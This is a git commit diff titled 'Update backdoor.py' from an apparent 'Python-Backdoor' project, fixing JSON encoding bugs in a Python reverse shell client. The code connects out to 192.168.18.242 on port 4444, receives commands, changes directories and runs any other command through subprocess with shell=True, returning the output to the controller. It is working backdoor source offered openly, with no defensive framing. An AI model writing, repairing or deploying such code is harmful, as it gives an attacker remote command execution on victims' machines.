12c580d16daa1d1ec5341453a805fbda0637fd1a
legend017 <rishiyadavofficial1@gmail.com>
2026-07-27 08:49:05 +0545

    Update backdoor.py

--- Python-Backdoor/backdoor.py
+++ Python-Backdoor/backdoor.py
@@ -5,12 +5,12 @@ import os
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(('192.168.18.242',4444))
 while True:
-        command_recv = json.loads(s.recv(65000)).decode()   
+        command_recv = json.loads(s.recv(65000).decode())   
         if command_recv == 'quit':
                 break
         elif command_recv[:3] == 'cd ':
                 os.chdir(command_recv[3:])
-                s.send(json.dump('').encode())
+                s.send(json.dumps('').encode())
         else:
                 output = subprocess.check_output(command_recv, shell=True)
                 s.send(json.dumps(output.decode()).encode())            
